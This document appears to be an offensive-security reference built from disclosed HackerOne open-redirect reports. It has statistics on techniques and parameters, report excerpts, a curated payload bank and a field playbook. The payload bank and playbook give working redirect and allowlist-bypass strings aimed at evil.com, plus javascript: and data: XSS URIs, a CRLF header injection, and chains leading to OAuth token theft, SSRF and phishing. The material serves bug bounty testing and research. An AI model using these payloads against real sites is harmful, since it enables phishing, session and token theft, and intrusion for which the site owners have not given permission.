# Evidence appendix — Open Redirect

Mined from all **360 valid disclosed reports** for this class (74 paid, 21% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| redirect chain / Location header | 161 |
| encoding / double-encode / null byte | 44 |
| webhook / OAuth / SAML / integration abuse | 36 |
| header injection (Host / X-Forwarded / etc.) | 35 |
| subdomain / DNS / cert-transparency recon | 25 |
| Content-Type / body-format switch | 22 |
| admin / privileged-role context | 22 |
| public source-code / repo review | 21 |
| DOM / HTML source inspection | 20 |
| WAF / sanitizer / filter bypass | 19 |
| cache / CDN / unkeyed header | 18 |
| XML / SOAP / SAML / XXE | 18 |
| internal service / port / container | 18 |
| intercept & replay request in Burp | 15 |
| OAST / DNS / HTTP callback proof | 13 |
| file upload / filename / extension | 11 |
|  HosT/absolute-URL reset poisoning | 9 |
| JWT / token / base64 decode | 9 |
| HTTP method / verb tampering | 9 |
| two-account / cross-account replay | 8 |
| unauthenticated / removed-cookie test | 7 |
| parser confusion / normalization | 6 |
| second-order / stored / blind delivery | 5 |
| error message / stack trace probing | 4 |
| cloud metadata / IAM abuse | 4 |
| employee / developer public info | 4 |
| API docs / Swagger / introspection | 4 |
| JS bundle / source-map inspection | 3 |
| fuzzing / wordlist brute force | 3 |
| parameter pollution / duplicate keys | 2 |
| swap object ID / parameter value | 2 |
| mass assignment / extra request fields | 1 |
| public bucket / storage exposure | 1 |
| replay / modify a captured request | 1 |
| archive / Wayback endpoint discovery | 1 |
| deserialization / gadget chain | 1 |
| race / concurrency / timing | 1 |
| third-party data / paste / breach reuse | 1 |

## Tools mentioned

| Item | Count |
|---|---:|
| browser | 33 |
| source-code-review | 19 |
| devtools | 14 |
| burp | 12 |
| curl | 8 |
| burp-repeater | 6 |
| burp-intruder | 2 |
| dnsdump | 1 |
| postman | 1 |
| waybackurls | 1 |
| burp-collaborator | 1 |
| collaborator/oast | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| open redirect | 219 |
| bypass | 49 |
| host header | 36 |
| content-type | 33 |
| whitelist | 14 |
| bypassed | 11 |
| trailing slash | 6 |
| url-encode | 6 |
| %00 | 5 |
| bypassing | 4 |
| unicode | 3 |
| header injection | 3 |
| url encoded | 3 |
| transfer-encoding | 3 |
| chunked | 3 |
| backslash | 3 |
| allowlist | 3 |
| bypasses | 2 |
| double slash | 2 |
| url-encoded | 2 |
| content type | 2 |
| percent-encode | 2 |
| lowercase | 2 |
| %0d%0a | 1 |
| url encoding | 1 |
| mixed case | 1 |
| normalizes | 1 |
| denylist | 1 |

## Impact language

| Item | Count |
|---|---:|
| token | 67 |
| credential | 39 |
| admin | 36 |
| password | 35 |
| secret | 10 |
| localhost | 9 |
| financial | 6 |
| sensitive information | 5 |
| sensitive data | 4 |
| payment | 3 |
| api key | 3 |
| account takeover | 3 |
| unauthorized | 3 |
| internal network | 2 |
| rce | 1 |
| internal service | 1 |
| exfiltration | 1 |

## Parameters observed

| Item | Count |
|---|---:|
| name | 31 |
| type | 17 |
| value | 16 |
| target | 13 |
| url | 12 |
| href | 9 |
| charset | 5 |
| rel | 5 |
| src | 5 |
| next | 5 |
| return_url | 4 |
| class | 4 |
| redirect_uri | 4 |
| callback_url | 3 |
| phone_number | 3 |
| full_number | 3 |
| referrer | 3 |
| http-equiv | 3 |
| version | 2 |
| window.location | 2 |
| redirect | 2 |
| email | 2 |
| xabled | 2 |
| redirect_url | 2 |
| __cfduid | 2 |
| _ga | 2 |
| ajs_user_id | 2 |
| ajs_group_id | 2 |
| ajs_anonymous_id | 2 |
| intercom-id-nmyyq5i5 | 2 |

## Recurring approach patterns

- **2×** notice that you are redirected to and you re requested to complete oauth after logging in
  - e.g. Notice that you are redirected to ` and you're requested to complete OAuth after logging in.
- **1×** hi i found that an attacker is able to steal access tokens of facebook users via phabricator app
  - e.g. Hi, I found that an attacker is able to steal access_tokens of facebook users via Phabricator App (184510521580034).
- **1×** hi i noticed that your facebook application used in the import photo can be used to take over the facebook account of the user being attacked
  - e.g. Hi, I noticed that your Facebook application used in the "Import Photo" can be used to take over the Facebook account of the user being attacked.
- **1×** hi i found a bypass in the redirects won t work
  - e.g. Hi, I found a bypass in the redirects : ` won't work.
- **1×** proof steps click the link after clicking click the screen and you will be redirected to
  - e.g. Proof: STEPS: Click the link after clicking click the SCREEN and you will be redirected to
- **1×** for the second way i verified that the password reset functionality on the irc cloud website does not retrieve the host header when sending emails
  - e.g. For the second way, I verified that the password reset functionality on the IRC Cloud website does not retrieve the Host header when sending emails.
- **1×** here is the video of the poc the link i used in the video to report reporter user id reporter s id please fix this fastly thanks good day
  - e.g. Here is the video of the POC : The link I used in the video : TO REPORT]&reporter_user_id=[REPORTER's ID] Please fix this fastly :)) Thanks, Good day :)
- **1×** for example works doesn t work i will investigate it further and get back with details if i find something more
  - e.g. For example: - works - doesn't work I will investigate it further and get back with details if I find something more.
- **1×** hi two weeks ago i found a cross domain ajax request but due to the fact that you uses a very strict content security policy i hesitated to send this
  - e.g. Hi, Two weeks ago, I found a Cross-domain AJAX request, but due to the fact that you uses a very strict Content Security Policy, I hesitated to send this.
- **1×** today i noticed that bug has been fixed
  - e.g. Today, I noticed that bug has been fixed.
- **1×** i tested on both using a windows installation with latest updates
  - e.g. I tested on both using a Windows 10 installation with latest updates.
- **1×** hi any user after logging into an any myshopify shop can be redirected to other domain
  - e.g. Hi, Any user after logging into an any myshopify shop can be redirected to other domain.
- **1×** hi i m found bug it is possible to send his message directly through url and redirect local
  - e.g. **Hi** I'm Found Bug It is Possible To Send His message Directly Through URL and Redirect Local .
- **1×** we have added validations to make sure the redirection always points to our own software
  - e.g. We have added validations to make sure the redirection always points to our own software.
- **1×** i realized that the link was edited to be like this
  - e.g. i realized that the link was edited to be like this : !!!
- **1×** i tried looking around and playing as much as possible but i wasn t unable to actually get a shopify com url
  - e.g. I tried looking around and playing as much as possible, but I wasn't unable to actually get a *.shopify.com url.
- **1×** if this is actually possible could you let me know how i found these via this btw there s quite a few more
  - e.g. (If this is actually possible could you let me know how?) I found these via this BTW: (there's quite a few more).
- **1×** on implementing url redirection care should be taken that it is not vulnerable to open redirection owasp open redirection a warning should be issued when a user is clicking on a website outside the host website
  - e.g. * On implementing URL redirection, care should be taken that it is not vulnerable to Open Redirection [OWASP Open Redirection]( * A warning should be issued when a user is clicking on a website outside the host website.
- **1×** hey i have noticed and redirect hidden field in admin staff login page so i though give it a little shot
  - e.g. Hey, I have noticed and redirect hidden field in admin/staff login page so I though give it a little shot!
- **1×** in addition most browsers all that i checked on will allow multiple slashes before the domain name type in to your browser and you will go to google
  - e.g. In addition, most browsers (all that I checked on) will allow multiple slashes before the domain name -- type " in to your browser, and you will go to google.
- **1×** adrianomarcmont was able to demonstrate this vulnerability by crafting a specially formatted url
  - e.g. adrianomarcmont was able to demonstrate this vulnerability by crafting a specially formatted URL.
- **1×** this issue is similar to but it is only exploitable via ms edge or internet explorer proof of concept clicking on a link set to including this one will change the still open report page to this works on current versions of ms edge and internet explorer
  - e.g. This issue is similar to #124889, but it is only exploitable via MS Edge or Internet Explorer 11 Proof Of Concept: Clicking on a link set to " (including this one) will change the still-open report page to This works on current versions of MS Edge and Internet Explorer 11.
- **1×** basically we have tested the web application against owasp top using industry common metholodogies
  - e.g. Basically we have tested the (web) application against [OWASP Top 10]( using industry common metholodogies.
- **1×** instead the person will then try to download the file by clicking on download left upper corner
  - e.g. Instead the person will then try to **download** the file by clicking on `Download` (left upper corner).

## Case studies (full excerpts)

### 26962 — open redirect in rfc6749
Internet Bug Bounty · $3000 · severity n/a · https://hackerone.com/reports/26962

OAuth Providers (servers) that strictly follow rfc6749 are vulnerable to open redirect. Let me explain, reading [0] If the request fails due to a missing, invalid, or mismatching redirection URI, or if the client identifier is missing or invalid, the authorization server SHOULD inform the resource owner of the error and MUST NOT automatically redirect the user-agent to the invalid redirection URI. If the resource owner denies the access request or if the request fails for reasons other than a missing or invalid redirection URI, the authorization server informs the client by adding the following parameters to the query component of the redirection URI using the "application/x-www-form-urlencoded" format, per Appendix B: Now let’s assume this. I am registering a new client to the victim.com provider. I register redirect uri attacker.com. According to [0] if I pass e.g. the wrong scope I am redirected back to attacker.com. Namely I prepare a url that is in this form: and this is works as an open redirector. Of course in the positive case if all the parameters are fine this doesn’t apply since the resource owner MUST approve the app via the consent screen (at least once). I have notified also this issue to the OAuth mailing list. See also and The consensus seems to be that some of the OAuth family spec should be updated... (currently under discussion) A solution would be to return 

### 1865991 — Open Redirect Vulnerability in Action Pack
Internet Bug Bounty · $2400 · medium · https://hackerone.com/reports/1865991

We were able to bypass the mechanism that prevents open redirects due to incomplete URL input validation. I have reported it below and written a patch to fix it. ## Impact Vulnerable code will look like this: Rails 7.0 introduced protection against open redirects from calling redirect_to with untrusted user input. In prior versions the developer was fully responsible for only providing trusted input. However the check introduced could be bypassed by a carefully crafted URL.

### 683298 — XSS and Open Redirect on MoPub Login
X / xAI · $1540 · severity n/a · https://hackerone.com/reports/683298

**Summary:** I found open redirect at the MoPub login page, It also allows javascript URIs, leading to XSS. **Description:** You can modify the "next" URL parameter to redirect to any website upon logging in on MoPub. ## Steps To Reproduce: 1. Take this URL: 2. Change " to whatever URL you want to redirect to. 3. Visit the URL and login 4. You will be redirected to that site ## Impact: Outlined in Impact section below ## Supporting Material/References: Here's a proof of concept using the URL javascript:alert("proof of concept"): {F568245} ## Impact An attacker could use this for phishing, cookie jacking, etc. since it allows javascript URIs and therefore XSS vectors. Additionally, they could use URL encoding to hide the URL that the victim is being redirected to.

### 49759 — Open Redirect leak of authenticity_token lead to full account take over.
X / xAI · $1400 · severity n/a · https://hackerone.com/reports/49759

Hey guys URL: when I click 'Follow' I will send my POST request to witch contains my authenticity_token that can be used for anything like tweeting, following, sending messages, changing username.,.,.etc it can be used too to Add a mobile number, and then steal the account by recovering it by the mobile number. Thank You.

### 260744 — [dev.twitter.com] XSS and Open Redirect
X / xAI · $1120 · medium · https://hackerone.com/reports/260744

Description === XSS via Request-URI which requires user interaction. The vulnerability is caused by the difference in the Request-URI processing in the Location header and in the link on the page. By creating an incorrect port in the link on the Location header, you can block the redirection for the FireFox browser. Next, using the difference in the processing, generate a "javascript" link on the page. PoC: Open Redirect === Browsers: Chrome, FireFox, Opera HTTP Response: PoC: XSS === Browsers: FireFox Steps to reproduce: Open and click the link HTTP Response: {F213436}

### 424443 — [PayPal Android] Remote theft of user session using push_notification_webview deeplink
PayPal · no bounty (valid finding) · medium · https://hackerone.com/reports/424443

A deeplink feature built into the PayPal Android application failed to validate the requested endpoint. A specifically crafted request from a website or separate app on the device could call the deeplink and direct traffic to any destination. While the impact was limited by compensating controls, headers containing sensitive data could be collected by a malicious actor. This vulnerability was discovered in collaboration with security researcher khilly, who contributed significantly to identifying and testing the deeplink misuse in the PayPal Android app. Together, we demonstrated how the lack of validation in the deeplink mechanism could allow a malicious app or webpage to redirect user sessions and expose headers containing sensitive information. The issue was responsibly disclosed and later resolved by PayPal.

### 1788006 — Open Redirect in Logout & Login
Expedia Group Bug Bounty · no bounty (valid finding) · medium · https://hackerone.com/reports/1788006

## Entry Hello there! While browsing on expedia, I logged out of the account and as soon as I logged out, it was calling me a parameter called "rurl" directly on the link, I examined it and was able to redirect successfully. ## Default Request GET /?logout=1 HTTP/2 Host: www.expedia.com Cookie: { REDACTED } User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers ## Default Response HTTP/2 200 OK ##In response, it redirects us to the homepage. ## Vulnerability Request GET /?logout= HTTP/2 Host: www.expedia.com Cookie: { REDACTED } User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers ## Note The part that exposes to explicit redirection is "?" in the section after the address. is use. and whateve

## Full curated payload bank

### Basic

```text
//evil.com
///evil.com
////evil.com
https://evil.com
http://evil.com
//evil.com/%2e%2e
//evil.com/path
https:evil.com
http:evil.com
\evil.com
```

### Allowlist & parser bypass

```text
https://target.com@evil.com
https://target.com.evil.com
https://target.com\@evil.com
https://target.com%2f@evil.com
https://target.com%00.evil.com
https://target.com%20.evil.com
https://target.com#@evil.com
https://target.com?@evil.com
https://evil.com#target.com
https://evil.com?target.com
https://target.com/redirect?url=https://evil.com
//target.com.evil.com
//target.com@evil.com
//target.com%2f@evil.com
```

### Encoding & scheme tricks

```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com/%0d%0aLocation:%20https://evil.com
https://evil.com%2f..%2ftarget.com
https://evil.com/%2e%2e/target.com
%2f%2fevil.com
%252f%252fevil.com
https:%2f%2fevil.com
//evil.com\@target.com
//evil.com%5c@target.com
//evil.com	.target.com
//evil.com%09.target.com
```

## Field playbook (unedited)

### quick

- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.
- Test scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.
- Bypass allowlists with userinfo, subdomain suffix, and path confusion.
- Check login/logout, OAuth callbacks, shorteners, and mobile deep links.

### payloads

- `//evil.com` `https://target.com@evil.com` `https://target.com.evil.com`
- `https://target.com\@evil.com` `//evil.com/%2e%2e` `////evil.com`
- `javascript:alert(1)` `data:text/html,...` when the redirect is client-side
- `https://target.com/redirect?url=https://evil.com` chained

### bypass

- Double URL-encode, unicode normalize, and mixed case the scheme/host.
- Use an allowlisted host with an open redirect to reach the final target.
- Exploit parser differences between validation and navigation.

### surface

- next
- url
- return
- redirect
- redirect_uri
- continue
- dest
- callback
- image_url
- checkout

### tools

- Burp
- gf redirect
- waybackurls
- ffuf

### chain

- Open redirect -> OAuth token theft.
- Open redirect -> SSRF allowlist bypass.
- Open redirect -> phishing.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class open-redirect
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class open-redirect --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
